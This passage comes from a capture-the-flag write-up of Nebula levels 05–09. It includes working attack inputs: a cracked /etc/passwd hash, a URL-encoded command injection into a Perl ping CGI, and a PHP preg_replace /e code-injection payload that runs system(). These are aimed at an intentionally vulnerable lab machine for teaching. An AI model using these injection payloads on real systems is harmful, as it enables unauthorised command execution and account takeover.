+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@localhost
+</span><span class='line'>  
+</span><span class='line'>      _   __     __          __     
+</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
+</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
+</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
+</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
+</span><span class='line'>                                    
+</span><span class='line'>    exploit-exercises.com/nebula
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>For level descriptions, please see the above URL.
+</span><span class='line'>
+</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
+</span><span class='line'>XX is the level number.
+</span><span class='line'>
+</span><span class='line'>Currently there are 20 levels (00 - 19).
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>New release '12.04 LTS' available.
+</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Ubuntu system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span><span class='line'>applicable law.
+</span><span class='line'>
+</span><span class='line'>flag05@nebula:~$ getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level06</h3>
+
+<p>The flag06 account credentials came from a legacy unix system.</p>
+
+<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>
+
+<p>I looked around a bit, didn&rsquo;t find anything interesting in the files owned by flag06. But keeping the hint in mind, I took a cursory glance at the <code>/etc/passwd</code> file, and bingo!:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ cat /etc/passwd
+</span><span class='line'>...
+</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The password hash for the flag06 user is inside <em>/etc/passwd</em>! (as a remnant of the old times when this file also contained the passwords for the users). Time to get cracking! I copied the hash to a file and ran John on it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# john --show hash
+</span><span class='line'>?:hello
+</span><span class='line'>
+</span><span class='line'>1 password hash cracked, 0 left</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the password is <em>hello</em>. Now it&rsquo;s just a matter of ssh&#8217;ing and getting the flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ ssh flag06@localhost
+</span><span class='line'>The authenticity of host 'localhost (127.0.0.1)' can't be established.
+</span><span class='line'>ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
+</span><span class='line'>Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+</span><span class='line'>  
+</span><span class='line'>      _   __     __          __     
+</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
+</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
+</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
+</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
+</span><span class='line'>                                    
+</span><span class='line'>    exploit-exercises.com/nebula
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>For level descriptions, please see the above URL.
+</span><span class='line'>
+</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
+</span><span class='line'>XX is the level number.
+</span><span class='line'>
+</span><span class='line'>Currently there are 20 levels (00 - 19).
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>flag06@localhost's password: 
+</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>New release '12.04 LTS' available.
+</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Ubuntu system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span><span class='line'>applicable law.
+</span><span class='line'>
+</span><span class='line'>flag06@nebula:~$ getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level 07</h3>
+
+<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
+
+<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Start by looking inside the <em>thttpd.conf</em> for some options and information about how the server is set up (thttpd is a HTTP server designed for simplicity, speed and portability). I only kept the lines that interested me in the output below:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>...
+</span><span class='line'># Specifies an alternate port number to listen on.
+</span><span class='line'>port=7007
+</span><span class='line'>
+</span><span class='line'># Specifies what user to switch to after initialization when started as root.
+</span><span class='line'>user=flag07
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the web server runs as the flag07 user. I pointed my browser to <a href="http://192.168.80.133:7007/index.cgi">http://192.168.80.133:7007/index.cgi</a> and saw some usage output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
+</span><span class='line'>            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
+</span><span class='line'>            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
+</span><span class='line'>            [-T tstamp-options] [-Q tos] [hop1 ...] destination</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looking in the source code, the program needs a Host parameter, otherwise it will display this usage information. I tested it by changing the URL to <a href="http://192.168.80.133:7007/index.cgi?Host=localhost">http://192.168.80.133:7007/index.cgi?Host=localhost</a> and the ping was run successfully:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PING localhost (127.0.0.1) 56(84) bytes of data.
+</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.025 ms
+</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.028 ms
+</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.034 ms
+</span><span class='line'>
+</span><span class='line'>--- localhost ping statistics ---
+</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+</span><span class='line'>rtt min/avg/max/mdev = 0.025/0.029/0.034/0.003 ms</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it&rsquo;s now a matter of injecting the command we want this program to run. I first tried <a href="http://192.168.80.133:7007/index.cgi?Host=localhost;getflag">http://192.168.80.133:7007/index.cgi?Host=localhost;getflag</a> to stack another command after the ping, but it didn&rsquo;t work. I had to URL encode the ; for it to work: <a href="http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag">http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag</a></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PING localhost (127.0.0.1) 56(84) bytes of data.
+</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.017 ms
+</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.036 ms
+</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.045 ms
+</span><span class='line'>
+</span><span class='line'>--- localhost ping statistics ---
+</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+</span><span class='line'>rtt min/avg/max/mdev = 0.017/0.032/0.045/0.013 ms
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level 08</h3>
+
+<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
+
+<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>
+
+<p>There is a capture.pcap file lying around for our convenience. I transfered it to my machine so I can look at it in Wireshark. Followed TCP Stream and saw a potential password:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/nebula/level8.png" title="level8" alt="level8"></p>
+
+<p>So the user tried to log in to something called wwwbugs, which I assumed it&rsquo;s irrelevant to the challenge. I tried SSH&#8217;ing as flag08 with the password of <em>backdoor&hellip;00Rm8.ate</em>, but of course it didn&rsquo;t work. Next I tried removing the dots and keeping only the letters and numbers but that didn&rsquo;t work either. But I was fairly sure the password must be related to this string. When looking at the stream in hex, I thought there must be a pattern for those dots:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/nebula/level8hex.png" title="level8hex" alt="level8hex"></p>
+
+<p>The hex for all the dots in the string is <em>7f</em>, but when looking at the Ascii table, hex encoding for dots is <em>2e</em>. So these aren&rsquo;t really dots! At the very end of the Ascii table I saw that <em>7f</em> actually represents the DEL key. So these dots are placeholders for when the DEL key was pressed. The user must have had trouble remembering his password or something. With this discovery in mind, it&rsquo;s possible to reconstruct the valid password:</p>
+
+<ul>
+<li><p>backdoor&hellip;00Rm8.ate &ndash;> backdoor + DELETE 3 times = backd</p></li>
+<li><p>00Rm8.ate + DELETE 1 time = 00Rmate</p></li>
+</ul>
+
+
+<p>So the password is  <code>backd00Rmate</code>. At least now it looks more like a password. Tried to SSH as flag08 now with this password and it worked!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level08@nebula:/home/flag08$ ssh flag08@localhost
+</span><span class='line'>  
+</span><span class='line'>      _   __     __          __     
+</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
+</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
+</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
+</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
+</span><span class='line'>                                    
+</span><span class='line'>    exploit-exercises.com/nebula
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>For level descriptions, please see the above URL.
+</span><span class='line'>
+</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
+</span><span class='line'>XX is the level number.
+</span><span class='line'>
+</span><span class='line'>Currently there are 20 levels (00 - 19).
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>flag08@localhost's password: 
+</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>New release '12.04 LTS' available.
+</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Ubuntu system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span><span class='line'>applicable law.
+</span><span class='line'>
+</span><span class='line'>flag08@nebula:~$ getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level 09</h3>
+
+<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>
+
+<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, me and regex don&rsquo;t get along at all! After looking at the code, I had only 2 ideas / leads:</p>
+
+<ul>
+<li><p>the <em>markup</em> function takes a <strong>$use_me</strong> parameter which isn&rsquo;t used in the code</p></li>
+<li><p>the solution probably revolves around a <em>preg_replace</em> exploit (I had a distant memory of encountering and exploiting this in another challenge which I couldn&rsquo;t remember)</p></li>
+</ul>
+
+
+<p>After some googling, I found out that indeed <em>preg_replace</em> can be exploited, but first what exactly does this function do?</p>
+
+<ul>
+<li><strong>preg_replace($pattern, $replacement, $subject)</strong> &ndash; Searches <em>subject</em> for matches to <em>pattern</em> and replaces them with <em>replacement</em>.</li>
+</ul>
+
+
+<p>Now let&rsquo;s see how and why it can be exploited. From <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> I read this:</p>
+
+<blockquote><p>e (PREG_REPLACE_EVAL) &ndash; If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string,
+evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes () and NULL chars will
+be escaped by backslashes in substituted backreferences.</p></blockquote>
+
+<p>On the page there is also a security warning for using this function and an example of code injection. Remote code execution is possible because unsanitised user input is <em>eval()</em>ed.</p>
+
+<p>Also you can read more about this vulnerability and exploit here: <a href="http://www.madirish.net/402">http://www.madirish.net/402</a></p>
+
+<p>Before anything else, let&rsquo;s just see what happens when running the binary. I made some files in <em>tmp</em> for this purpose to avoid reading superfluous system files:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/test
+</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
+</span><span class='line'>nothing to see here</span></code></pre></td></tr></table></div></figure>
+
+
+<p>PHP complained about the missing $argv[2] (remember the <em>$use_me</em> is unused), but it still read the file. If I tried 2 arguments, the error disappeared, but the second file wasn&rsquo;t output (how could they forget to use the <em>$use_me</em>?!). Ok, enough of that! So I know now that I can get arbitrary code execution by injecting some code to be <em>eval()</em>ed by <em>preg_replace</em>. This means that I will actually have to grasp what the regex is doing&hellip;oh, the fun!</p>
+
+<p>First of all, the line that facilitates the exploitation is:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This operates on the contents of the file that was read, you can see that the <em>/e</em> modifier is being used, and also that the <em>spam()</em> function is called. This function seems to replace <code>.</code> with <em>dot</em> and <em>@</em> with <em>AT</em>, but I plugged it into a PHP interpreter to be sure:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>haxor@hack.com becomes haxor AT hack dot com</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It is this function where we will inject our code. But we have to match the pattern that is expected. After some pain and suffering, and 2 excellent regex resources that even my regex-incompatible brain could grasp (<a href="http://gnosis.cx/publish/programming/regular_expressions.html">this tutorial</a> and <a href="http://www.rexegg.com/regex-quickstart.html">this cheatsheet</a>), I concluded that the pattern to be matched is like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[email haxor@hack.com]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After the replacement operations the above becomes <code>haxor AT hack dot com</code> and the [] is replaced with &lt;>. Now for the exploitation. On the <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> page, the exploit string for the provided code is:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I admit I don&rsquo;t understand why it works while sandwiched between {}. The h1 tags and $_GET apply to the example code on the page, so in this case I kept the string:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>{${eval()}}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Instead of <em>eval()</em>, we want <em>system()</em> to call an external program. Of course don&rsquo;t forget that you have to sandwich it inside the pattern <code>[email ]</code>. Now it becomes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[email {${system()}}]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool. Now we want to run <em>getflag</em>, so how should we pass it to <em>system()</em>? Remember the unsued variable <em>$use_me</em>!</p>
+
+<p>At this point I injected some harmless printing functions inside an interpreter to check if the injection worked successfully, and when it did, I moved back to our particular case. So here&rsquo;s how the situation looks now:</p>
+
+<ul>
+<li><p>we want to run <em>getflag</em></p></li>
+<li><p>we can run external commands in PHP with <em>system()</em></p></li>
+<li><p>we have the $use_me parameter available and unused anywhere, so why not use it?</p></li>
+<li><p>we have to put the exploit into a file to be read by the binary</p></li>
+</ul>
+
+
+<p>With all these requirements in mind, I created a file with the exploit:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ cat /tmp/useme
+</span><span class='line'>[email {${system($use_me)}}]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can finally use that $use_me variable, since whatever we place in it will be executed by <em>system()</em>. Running it now produces an error but it still does the job:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
